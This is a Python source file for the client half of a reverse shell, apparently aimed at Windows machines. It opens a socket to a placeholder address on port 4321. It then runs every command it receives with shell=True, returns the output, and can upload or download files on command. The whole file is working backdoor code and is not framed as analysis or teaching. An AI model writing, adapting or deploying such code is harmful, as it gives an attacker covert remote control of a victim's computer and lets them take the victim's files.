import socket
import json
import subprocess
import os

# functions

def safe_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def safe_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1) # give time to receive more bytes or break the loop
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, "rb")
    s.send(f.read())

def shell():
    while True:
        command = safe_recv()
        if command == "quit":
            break
        elif command == "clear":
            os.system('cls')
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:6] == "upload":
            download_file(command[7:])
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command == "help":
            pass
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read() # byte type result
            result = result.decode()
            safe_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('IP', 4321)) # specify the port and the address that you binded your server side socket to, in order to connect the target machine

subprocess.call(['chcp', '65001'], shell = True)
shell()
